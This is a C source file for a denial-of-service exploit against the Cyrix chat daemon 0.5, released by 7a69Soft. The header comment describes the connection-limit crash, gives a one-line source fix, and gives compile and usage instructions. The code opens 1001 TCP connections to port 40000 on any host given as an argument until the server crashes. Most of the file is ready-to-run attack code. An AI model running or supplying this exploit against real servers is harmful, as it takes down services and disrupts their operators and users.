/*
/* A SIMPLE EXPLOIT FOR A DOS FOUND IN CYRIX CHAT DAEMON 0.5
/* 7a69Soft (www.7a69ezine.org)
/* by ireick
/*
/* First of all, disculp my poor english and my poor code :|
/*
/* This isn't the only bug found in cyrix server so if you 
/* are going to use cyrix daemon check the source code :). It is
/* only for probe that cyrix server crash.
/*
/* I checked it for run cyrix chat server in my LAN :) but I think
/* that it isn't a daemon very used.
/*
/* From the README:
/* "Cyrix is a multi-functional chat server that was
/* designed to service thin clients (telnet, netcat, etc.).
/* It is a feature-rich chat server that incorporates much
/* of the functionality and reliability that is expected
/* from chat daemons. The difference is that Cyrix is
/* based on a totally new and inventive approach to chat
/* services. It goes beyond straight-forward IRC based
/* daemons that are very much uniform with one another.
/* It gives the user an abundant command set as well as
/* many original and unprecedented chat commands to assist
/* the user in a virtual chat experience without the
/* hassle of downloading and installing a client to do
/* much of the servers work for it.
/* Cyrix is a developmental project and will eventually
/* overrun IRC and perhaps even mankind."(extracted of cyrix README)
/*
/* The server crash when it receives more connections than the
/* number specified in chat.h (1000 as default)
/*
/* For fix this bug you must replace the next line in cyrix.c:
/* if(i==MAXUSERS) qerr("too many clients");
/* for the next line:
/* if(i==MAXUSERS) shutdown(accept, 2); /*added by ireick from 7a69*/
/*
/* And now the bug is fixed :) and the exploit doesn't run.
/*
/* Use:
/* gcc cyrixplof.c -o cyrixplof
/* ./cyrixplof host
/*
/* Greetz to people of #root and to 7a69 staff (all you are wonderfull :_) )
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>


#define PORT 40000 /*port where the server runs*/
#define MAX 1001 /*MAXUSERS + 1*/

int main(int argc, char *argv[])
{
int i, sockfd;
struct hostent *he;
struct sockaddr_in server_addr;

if (argc < 2){
fprintf(stderr,"uso: %s host\n", argv[0]);
exit(1);
}

if ((he=gethostbyname(argv[1])) == NULL) {
herror("gethostbyname");
exit(1);
}

for (i=1; i<=MAX; i++) {
if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
perror("socket");
exit(1);
}
server_addr.sin_family = AF_INET;
server_addr.sin_port = htons(PORT);
server_addr.sin_addr = *((struct in_addr *)he->h_addr);
bzero(&(server_addr.sin_zero), 8);
if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
perror("connect");
printf("if 1 or more connect have been done the cyrix chat daemon probably has crashed\n");
exit(1);
}
sleep(1);
printf("%i connect\n", i);
}
printf("The cyrix chat daemon has crashed!!!\n");
close(sockfd);
return 0;
}



